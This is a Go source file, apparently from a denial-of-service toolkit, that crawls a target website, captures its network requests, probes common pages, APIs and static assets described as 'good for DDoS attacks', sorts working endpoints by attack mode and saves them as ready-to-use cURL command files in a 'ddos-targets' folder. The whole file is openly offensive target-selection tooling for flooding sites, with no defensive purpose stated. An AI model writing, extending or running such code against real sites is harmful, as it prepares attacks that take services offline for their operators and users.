package ddosscanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/letgo/ddos"
	"github.com/letgo/scanner"
)

// Common endpoints to test
var commonEndpoints = []string{
	"/",
	"/api",
	"/api/v1",
	"/api/v2",
	"/search",
	"/login",
	"/auth",
	"/index",
	"/home",
	"/about",
	"/contact",
	"/products",
	"/services",
}

// Common asset paths to test (good for DDoS attacks)
var commonAssetPaths = []string{
	// JavaScript files
	"/js/main.js",
	"/js/app.js",
	"/js/script.js",
	"/static/js/main.js",
	"/assets/js/main.js",
	"/javascript/main.js",
	"/js/bundle.js",
	"/js/index.js",
	
	// CSS files
	"/css/main.css",
	"/css/style.css",
	"/css/app.css",
	"/static/css/main.css",
	"/assets/css/main.css",
	"/styles/main.css",
	
	// Images
	"/images/logo.png",
	"/images/logo.jpg",
	"/img/logo.png",
	"/img/logo.jpg",
	"/static/images/logo.png",
	"/assets/images/logo.png",
	"/images/favicon.ico",
	"/favicon.ico",
	
	// Fonts
	"/fonts/main.woff2",
	"/fonts/main.woff",
	"/static/fonts/main.woff2",
	"/assets/fonts/main.woff2",
	
	// Common static paths
	"/static/main.js",
	"/static/main.css",
	"/assets/main.js",
	"/assets/main.css",
	"/public/main.js",
	"/public/main.css",
	
	// API endpoints that might return data
	"/api/status",
	"/api/health",
	"/api/ping",
	"/health",
	"/status",
	"/ping",
}

// CommonHTTPMethods are HTTP methods to test
var CommonHTTPMethods = []string{"GET", "POST", "PUT", "DELETE"}

// TargetScanner orchestrates the scanning process
type TargetScanner struct {
	config      ScanConfig
	validator   *Validator
	crawler     *Crawler
	results     *ScanResult
	resultsMu   sync.Mutex
}

// NewTargetScanner creates a new target scanner
func NewTargetScanner(config ScanConfig) (*TargetScanner, error) {
	validator := NewValidator(config)
	crawler, err := NewCrawler(config)
	if err != nil {
		return nil, err
	}

	return &TargetScanner{
		config:    config,
		validator: validator,
		crawler:   crawler,
		results: &ScanResult{
			TargetURL:      config.TargetURL,
			ScanStartTime:  time.Now(),
			ValidEndpoints: make(map[ddos.AttackMode][]EndpointResult),
		},
	}, nil
}

// Scan performs the complete scanning process
func (ts *TargetScanner) Scan(ctx context.Context) (*ScanResult, error) {
	ts.results.ScanStartTime = time.Now()

	// Collect all discovered endpoints
	var allEndpoints []string
	var endpointMethods = make(map[string][]string) // URL -> []methods
	var endpointSources = make(map[string]string)    // URL -> discovery source

	// If MaxDepth is 0, user provided specific URLs - validate them and discover assets
	if ts.config.MaxDepth == 0 {
		// Direct URL validation mode - user provided specific URLs
		// Use network interceptor to capture ALL requests made during page load
		if ts.config.OnProgress != nil {
			ts.config.OnProgress("Capturing network requests", 0, 1, 0)
		}
		
		// Create network interceptor to capture all requests
		interceptor, err := NewNetworkInterceptor(
			ts.config.TargetURL,
			ts.config.UserAgent,
			ts.config.CustomHeaders,
			ts.config.Timeout,
		)
		if err == nil {
			// Load page and capture all network requests
			networkRequests, err := interceptor.LoadPageAndCaptureRequests(ctx, ts.config.TargetURL)
			if err == nil {
				// Process all captured network requests
				for _, netReq := range networkRequests {
					// Only include requests from the same domain
					if !IsSameDomainOrSubdomain(netReq.URL, ts.config.TargetURL) {
						continue
					}
					
					if !contains(allEndpoints, netReq.URL) {
						allEndpoints = append(allEndpoints, netReq.URL)
						
						// Determine methods to test based on request type
						methods := []string{netReq.Method}
						if netReq.Type == "api" {
							// For API endpoints, test multiple methods
							if !contains(methods, "GET") {
								methods = append(methods, "GET")
							}
							if !contains(methods, "POST") {
								methods = append(methods, "POST")
							}
						} else if netReq.Type == "html" {
							// For HTML pages, test GET and POST
							methods = []string{"GET", "POST"}
						} else {
							// For assets, test GET and HEAD
							methods = []string{"GET", "HEAD"}
						}
						
						// Merge with existing methods
						if existingMethods, exists := endpointMethods[netReq.URL]; exists {
							for _, m := range methods {
								if !contains(existingMethods, m) {
									existingMethods = append(existingMethods, m)
								}
							}
							endpointMethods[netReq.URL] = existingMethods
						} else {
							endpointMethods[netReq.URL] = methods
						}
						
						// Mark source as network interception
						endpointSources[netReq.URL] = "network"
					}
				}
			}
		}
		
		// Also add the target URL itself with multiple HTTP methods to test
		if !contains(allEndpoints, ts.config.TargetURL) {
			allEndpoints = append(allEndpoints, ts.config.TargetURL)
			endpointMethods[ts.config.TargetURL] = []string{"GET", "POST", "PUT", "DELETE"}
			endpointSources[ts.config.TargetURL] = "direct"
		}
		
		// Discover additional assets (JS, CSS, images, etc.) from the base URL
		if ts.config.OnProgress != nil {
			ts.config.OnProgress("Discovering additional assets", len(allEndpoints), 100, 10)
		}
		assetEndpoints := ts.discoverAssets(ctx, ts.config.TargetURL)
		for _, assetURL := range assetEndpoints {
			if !contains(allEndpoints, assetURL) {
				allEndpoints = append(allEndpoints, assetURL)
				if methods, exists := endpointMethods[assetURL]; exists {
					if !contains(methods, "GET") {
						methods = append(methods, "GET")
					}
					if !contains(methods, "HEAD") {
						methods = append(methods, "HEAD")
					}
					endpointMethods[assetURL] = methods
				} else {
					endpointMethods[assetURL] = []string{"GET", "HEAD"} // Assets typically only support GET/HEAD
				}
				if _, exists := endpointSources[assetURL]; !exists {
					endpointSources[assetURL] = "asset-discovery"
				}
			}
		}
		
		// Also test common asset paths
		if ts.config.OnProgress != nil {
			ts.config.OnProgress("Testing common asset paths", len(allEndpoints), 100, 20)
		}
		commonAssets := ts.testCommonAssetPaths(ctx)
		for _, assetURL := range commonAssets {
			if !contains(allEndpoints, assetURL) {
				allEndpoints = append(allEndpoints, assetURL)
				if methods, exists := endpointMethods[assetURL]; exists {
					if !contains(methods, "GET") {
						methods = append(methods, "GET")
					}
					if !contains(methods, "HEAD") {
						methods = append(methods, "HEAD")
					}
					endpointMethods[assetURL] = methods
				} else {
					endpointMethods[assetURL] = []string{"GET", "HEAD"}
				}
				if _, exists := endpointSources[assetURL]; !exists {
					endpointSources[assetURL] = "common-asset"
				}
			}
		}
	} else {
		// Discovery mode - use scanner, crawler, and common endpoints
		
		// Phase 1: Use existing scanner to find login/auth endpoints
		if ts.config.OnProgress != nil {
			ts.config.OnProgress("Scanning", 0, 100, 0)
		}
		scannerEndpoints := ts.scanWithExistingScanner(ctx)
		for _, ep := range scannerEndpoints {
			allEndpoints = append(allEndpoints, ep.Result.URL)
			if methods, exists := endpointMethods[ep.Result.URL]; exists {
				endpointMethods[ep.Result.URL] = append(methods, ep.Method)
			} else {
				endpointMethods[ep.Result.URL] = []string{ep.Method}
			}
			endpointSources[ep.Result.URL] = "scanner"
		}

		// Phase 2: Add the target URL itself if not already discovered
		if !contains(allEndpoints, ts.config.TargetURL) {
			allEndpoints = append(allEndpoints, ts.config.TargetURL)
			endpointMethods[ts.config.TargetURL] = []string{"GET", "POST"}
			endpointSources[ts.config.TargetURL] = "direct"
		}

		// Phase 3: Crawl website to discover links
		if ts.config.OnProgress != nil {
			ts.config.OnProgress("Crawling", len(allEndpoints), 100, 50)
		}
		crawlResults, err := ts.crawler.Crawl(ctx)
		if err == nil {
			for _, result := range crawlResults {
				if !contains(allEndpoints, result.URL) {
					allEndpoints = append(allEndpoints, result.URL)
					endpointMethods[result.URL] = []string{"GET"}
					endpointSources[result.URL] = "crawler"
				}
			}
		}

		// Phase 4: Test common endpoints
		if ts.config.OnProgress != nil {
			ts.config.OnProgress("Testing common endpoints", len(allEndpoints), 100, 70)
		}
		commonEndpoints := ts.testCommonEndpoints(ctx)
		for _, ep := range commonEndpoints {
			if !contains(allEndpoints, ep) {
				allEndpoints = append(allEndpoints, ep)
				endpointMethods[ep] = []string{"GET", "POST"}
				endpointSources[ep] = "common"
			}
		}
	}

	ts.results.TotalDiscovered = len(allEndpoints)

	// Phase 4: Validate all discovered endpoints
	if ts.config.OnProgress != nil {
		ts.config.OnProgress("Validating", 0, len(allEndpoints), 80)
	}
	ts.validateEndpoints(ctx, allEndpoints, endpointMethods, endpointSources)

	ts.results.ScanEndTime = time.Now()
	ts.results.TotalValidated = len(ts.results.Endpoints)

	// Group valid endpoints by attack method
	for _, endpoint := range ts.results.Endpoints {
		for attackMode, isValid := range endpoint.IsValid {
			if isValid {
				ts.results.ValidEndpoints[attackMode] = append(ts.results.ValidEndpoints[attackMode], endpoint)
			}
		}
	}

	return ts.results, nil
}

// scanWithExistingScanner uses the existing scanner package
func (ts *TargetScanner) scanWithExistingScanner(ctx context.Context) []ScannerEndpoint {
	var endpoints []ScannerEndpoint

	scannerConfig := scanner.ScannerConfig{
		BaseURL:       ts.config.TargetURL,
		MaxThreads:    ts.config.MaxThreads,
		Timeout:       ts.config.Timeout,
		UserAgent:     ts.config.UserAgent,
		CustomHeaders: ts.config.CustomHeaders,
	}

	sc := scanner.New(scannerConfig)
	results, err := sc.Scan(ctx)
	if err != nil {
		return endpoints
	}

	for _, result := range results {
		// Test both GET and POST for discovered endpoints
		endpoints = append(endpoints, ScannerEndpoint{
			Result: result,
			Method: "GET",
		})
		// If it's an API or auth endpoint, also test POST
		if strings.Contains(result.URL, "/api") || strings.Contains(result.URL, "/auth") || strings.Contains(result.URL, "/login") {
			endpoints = append(endpoints, ScannerEndpoint{
				Result: result,
				Method: "POST",
			})
		}
	}

	return endpoints
}

// testCommonEndpoints tests common endpoint paths
func (ts *TargetScanner) testCommonEndpoints(ctx context.Context) []string {
	var validEndpoints []string
	baseURL, err := url.Parse(ts.config.TargetURL)
	if err != nil {
		return validEndpoints
	}

	for _, path := range commonEndpoints {
		testURL := baseURL.ResolveReference(&url.URL{Path: path}).String()
		// Quick test to see if endpoint exists
		if ts.quickTest(ctx, testURL) {
			validEndpoints = append(validEndpoints, testURL)
		}
	}

	return validEndpoints
}

// quickTest performs a quick test to see if endpoint exists
func (ts *TargetScanner) quickTest(ctx context.Context, endpointURL string) bool {
	req, err := http.NewRequestWithContext(ctx, "GET", endpointURL, nil)
	if err != nil {
		return false
	}

	req.Header.Set("User-Agent", ts.config.UserAgent)

	client := &http.Client{
		Timeout: 3 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// Accept 2xx, 3xx, 4xx (but not 5xx as it might be server errors)
	return resp.StatusCode >= 200 && resp.StatusCode < 500
}

// discoverAssets discovers asset files (JS, CSS, images, etc.) from a base URL
func (ts *TargetScanner) discoverAssets(ctx context.Context, baseURL string) []string {
	var assetURLs []string
	parsedBase, err := url.Parse(baseURL)
	if err != nil {
		return assetURLs
	}

	// Test common asset paths
	for _, assetPath := range commonAssetPaths {
		assetURL := parsedBase.ResolveReference(&url.URL{Path: assetPath}).String()
		
		// Quick test to see if asset exists
		if ts.quickTest(ctx, assetURL) {
			assetURLs = append(assetURLs, assetURL)
		}
	}

	// Also try to discover assets from the main page HTML
	assetURLs = append(assetURLs, ts.discoverAssetsFromHTML(ctx, baseURL)...)

	return assetURLs
}

// testCommonAssetPaths tests common asset paths
func (ts *TargetScanner) testCommonAssetPaths(ctx context.Context) []string {
	var assetURLs []string
	parsedBase, err := url.Parse(ts.config.TargetURL)
	if err != nil {
		return assetURLs
	}

	// Test common asset paths
	for _, assetPath := range commonAssetPaths {
		assetURL := parsedBase.ResolveReference(&url.URL{Path: assetPath}).String()
		
		// Quick test to see if asset exists
		if ts.quickTest(ctx, assetURL) {
			assetURLs = append(assetURLs, assetURL)
		}
	}

	return assetURLs
}

// discoverAssetsFromHTML fetches the main page and extracts asset URLs from HTML
func (ts *TargetScanner) discoverAssetsFromHTML(ctx context.Context, baseURL string) []string {
	var assetURLs []string

	req, err := http.NewRequestWithContext(ctx, "GET", baseURL, nil)
	if err != nil {
		return assetURLs
	}

	req.Header.Set("User-Agent", ts.config.UserAgent)

	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return assetURLs
	}
	defer resp.Body.Close()

	// Read HTML content (limit to first 100KB)
	bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, 100*1024))
	if err != nil {
		return assetURLs
	}

	html := string(bodyBytes)
	parsedBase, _ := url.Parse(baseURL)

	// Extract script tags
	scriptRegex := regexp.MustCompile(`<script[^>]+src=["']([^"']+)["']`)
	matches := scriptRegex.FindAllStringSubmatch(html, -1)
	for _, match := range matches {
		if len(match) > 1 {
			assetURL := match[1]
			absoluteURL, err := parsedBase.Parse(assetURL)
			if err == nil {
				assetURLs = append(assetURLs, absoluteURL.String())
			}
		}
	}

	// Extract link tags (CSS)
	linkRegex := regexp.MustCompile(`<link[^>]+href=["']([^"']+)["']`)
	matches = linkRegex.FindAllStringSubmatch(html, -1)
	for _, match := range matches {
		if len(match) > 1 {
			assetURL := match[1]
			// Check if it's a stylesheet
			matchIndex := strings.Index(html, match[0])
			if matchIndex >= 0 {
				endIndex := matchIndex + len(match[0]) + 100
				if endIndex > len(html) {
					endIndex = len(html)
				}
				if strings.Contains(html[matchIndex:endIndex], "stylesheet") || strings.HasSuffix(assetURL, ".css") {
					absoluteURL, err := parsedBase.Parse(assetURL)
					if err == nil {
						assetURLs = append(assetURLs, absoluteURL.String())
					}
				}
			}
		}
	}

	// Extract img tags
	imgRegex := regexp.MustCompile(`<img[^>]+src=["']([^"']+)["']`)
	matches = imgRegex.FindAllStringSubmatch(html, -1)
	for _, match := range matches {
		if len(match) > 1 {
			assetURL := match[1]
			absoluteURL, err := parsedBase.Parse(assetURL)
			if err == nil {
				assetURLs = append(assetURLs, absoluteURL.String())
			}
		}
	}

	return assetURLs
}

// validateEndpoints validates all discovered endpoints
func (ts *TargetScanner) validateEndpoints(ctx context.Context, endpoints []string, endpointMethods map[string][]string, endpointSources map[string]string) {
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, ts.config.MaxThreads)

	for i, endpointURL := range endpoints {
		select {
		case <-ctx.Done():
			return
		default:
		}

		methods := endpointMethods[endpointURL]
		if len(methods) == 0 {
			methods = []string{"GET"} // Default to GET
		}

		for _, method := range methods {
			wg.Add(1)
			semaphore <- struct{}{} // Acquire semaphore

			go func(url string, m string, idx int) {
				defer wg.Done()
				defer func() { <-semaphore }() // Release semaphore

				// Determine discovered by from endpointSources map
				discoveredBy := "common"
				if source, exists := endpointSources[url]; exists {
					discoveredBy = source
				} else {
					// Fallback to old logic for backward compatibility
					if idx < len(ts.scanWithExistingScanner(ctx)) {
						discoveredBy = "scanner"
					} else if idx < len(endpoints)/2 {
						discoveredBy = "crawler"
					}
				}

				result := ts.validator.ValidateEndpoint(ctx, url, m, discoveredBy)

				ts.resultsMu.Lock()
				ts.results.Endpoints = append(ts.results.Endpoints, result)
				ts.resultsMu.Unlock()

				if ts.config.OnProgress != nil {
					ts.config.OnProgress("Validating", idx+1, len(endpoints), 80+float64(idx+1)*20/float64(len(endpoints)))
				}
			}(endpointURL, method, i)
		}
	}

	wg.Wait()
}

// SaveResults saves validated endpoints to files
func (ts *TargetScanner) SaveResults(result *ScanResult) error {
	if err := EnsureDDOSTargetsDir(); err != nil {
		return fmt.Errorf("failed to create ddos-targets directory: %w", err)
	}

	siteName := ExtractSiteName(ts.config.TargetURL)

	// Create site-specific folder
	siteFolder := filepath.Join("ddos-targets", siteName)
	if err := os.MkdirAll(siteFolder, 0755); err != nil {
		return fmt.Errorf("failed to create site folder %s: %w", siteFolder, err)
	}

	for attackMode, endpoints := range result.ValidEndpoints {
		if len(endpoints) == 0 {
			continue
		}

		// Generate filename (using sanitized site name for filename, but folder uses original)
		methodName := string(attackMode)
		// For filename, use sanitized version (with hyphens) to ensure compatibility
		sanitizedSiteName := sanitizeFilename(siteName)
		filename := GenerateFileName(methodName, sanitizedSiteName)
		filepath := filepath.Join(siteFolder, filename)

		// Write cURL commands to file
		file, err := os.Create(filepath)
		if err != nil {
			continue // Skip this file if we can't create it
		}

		// Write header comment
		fmt.Fprintf(file, "# DDoS Target cURL Commands\n")
		fmt.Fprintf(file, "# Target: %s\n", ts.config.TargetURL)
		fmt.Fprintf(file, "# Attack Method: %s\n", methodName)
		fmt.Fprintf(file, "# Generated: %s\n", time.Now().Format(time.RFC3339))
		fmt.Fprintf(file, "# Total valid endpoints: %d\n\n", len(endpoints))

		// Write cURL commands
		for _, endpoint := range endpoints {
			if endpoint.CurlCommand != "" {
				fmt.Fprintf(file, "%s\n\n", endpoint.CurlCommand)
			}
		}

		file.Close()
	}

	// Only create files for valid endpoints - do not create discovered file if no valid endpoints
	// If no valid endpoints found, simply return without creating any file
	return nil
}

// contains checks if a string slice contains a value
func contains(slice []string, value string) bool {
	for _, item := range slice {
		if item == value {
			return true
		}
	}
	return false
}

// isAssetURL checks if a URL is likely an asset (JS, CSS, image, etc.)
func (ts *TargetScanner) isAssetURL(urlStr string) bool {
	urlLower := strings.ToLower(urlStr)
	assetExtensions := []string{".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".webp", ".ico", ".woff", ".woff2", ".ttf", ".otf", ".json", ".xml"}
	assetPaths := []string{"/js/", "/css/", "/img/", "/images/", "/static/", "/assets/", "/public/", "/fonts/", "/styles/"}
	
	for _, ext := range assetExtensions {
		if strings.Contains(urlLower, ext) {
			return true
		}
	}
	
	for _, path := range assetPaths {
		if strings.Contains(urlLower, path) {
			return true
		}
	}
	
	return false
}

